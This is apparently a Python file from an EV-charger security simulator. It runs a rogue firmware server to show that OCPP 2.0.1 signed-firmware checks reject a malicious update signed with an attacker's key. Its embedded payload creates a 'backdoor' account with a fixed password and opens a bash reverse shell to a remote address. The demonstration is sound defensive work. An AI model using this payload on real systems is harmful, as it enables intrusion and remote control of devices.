"""
===========================================================================
EVSecSim — OCPP 2.0.1 SECURE: malicious firmware blocked by signing (Attack 5)
===========================================================================

The signed-firmware-prevention counterpart of the 1.6 firmware RCE
(attack_firmware.py).  This is the rogue firmware distribution point: it
hosts a malicious payload and an ATTACKER signature over it.

The scenario GRANTS the attacker the strongest possible position: the
(compromised, but mutual-TLS-authenticated) CSMS issues a valid
UpdateFirmware command pointing the EVSE at this rogue server.  The
firmware reaches the EVSE.  The question is whether it installs.

It does not.  The EVSE verifies the firmware signature against the PINNED
manufacturer public key.  This payload is signed with the attacker's own
key — not the manufacturer's — so verification fails, and the EVSE emits
FirmwareStatusNotification(InvalidSignature) and refuses to install.

This is the OCPP 2.0.1 APPLICATION-LAYER control (signed firmware update)
doing the work — the EVSE rejects the malware even though it arrived over
an authenticated channel from an authenticated CSMS.  Transport TLS alone
would not stop a compromised CSMS; signed firmware does.

Served on :8090
  /firmware.bin       malicious payload
  /firmware.bin.sig   attacker signature (PKCS1v15/SHA256, attacker key)

HOW TO RUN
----------
  docker compose --profile v201-secure-firmware up
===========================================================================
"""

import http.server
import socketserver
import threading

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

RED, GREEN, YELLOW, BOLD, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[1m", "\033[0m"
PORT = 8090

# Malicious "firmware" — what a real attacker would try to install (cf. INL PoC #3).
MALICIOUS_PAYLOAD = b"""#!/bin/sh
# EVSecSim malicious firmware payload (would-be RCE)
useradd -m -s /bin/bash backdoor
echo 'backdoor:EV$ecr3t!' | chpasswd
nohup bash -i >& /dev/tcp/172.20.0.0/4444 0>&1 &
"""

# The attacker signs with ITS OWN key — it does not possess the manufacturer key.
_attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
ATTACKER_SIG = _attacker_key.sign(MALICIOUS_PAYLOAD, padding.PKCS1v15(), hashes.SHA256())


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path.endswith(".sig"):
            body = ATTACKER_SIG
            print(f"{YELLOW}[ROGUE-FW] served signature ({len(body)} bytes, attacker key){RESET}")
        else:
            body = MALICIOUS_PAYLOAD
            print(f"{RED}[ROGUE-FW] served malicious payload ({len(body)} bytes) -> EVSE{RESET}")
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main():
    print(f"\n{BOLD}{RED}{'='*60}{RESET}")
    print(f"{BOLD}{RED}  OCPP 2.0.1 malicious firmware server — Profile 3 target{RESET}")
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    print(f"  Serving malicious payload + attacker signature on :{PORT}")
    print(f"  Expectation: EVSE verifies signature vs pinned manufacturer key,")
    print(f"               finds it INVALID, and refuses to install.")
    print(f"  {YELLOW}(see EVSE terminal for the decisive InvalidSignature / BLOCKED){RESET}\n")

    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    main()
